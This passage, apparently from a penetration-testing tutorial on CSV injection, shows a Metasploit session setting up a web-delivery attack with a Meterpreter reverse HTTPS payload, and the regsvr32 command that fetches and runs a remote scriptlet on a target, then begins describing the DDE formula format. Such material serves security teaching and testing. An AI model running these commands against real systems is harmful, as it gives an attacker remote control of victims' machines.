3. To exploit a CSV injection, we will use the Script Web Delivery exploit module. First, we set the target to regsvr32 using the set TARGET 3 command, then we set the listening host and URI for the server and specify the payload to use followed by the listening host and port for the payload:

```
msf > use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) >
set TARGET 3
TARGET => 3
msf exploit(multi/script/web_delivery) >
set URIPATH /
URIPATH => /
msf exploit(multi/script/web_delivery) >
set SRVHOST 192.168.216.5
SRVHOST => 192.168.216.5
msf exploit(multi/script/web_delivery) >
set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
msf exploit(multi/script/web_delivery) >
set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(multi/script/web_delivery) >
set LPORT 443
LPORT => 443
msf exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.

[*] Started HTTPS reverse handler on
https://192.168.216.5:443
[*] Using URL: http://192.168.216.5:8080/
[*] Server started.
[*] Run the following command on the target machine:
regsvr32 /s /n /u
/i:http://192.168.216.5:8080/.sct scrobj.dll
```

Dynamic Data Exchange (DDE) uses the following format:

```
=DDE(server; file; item; mode)
```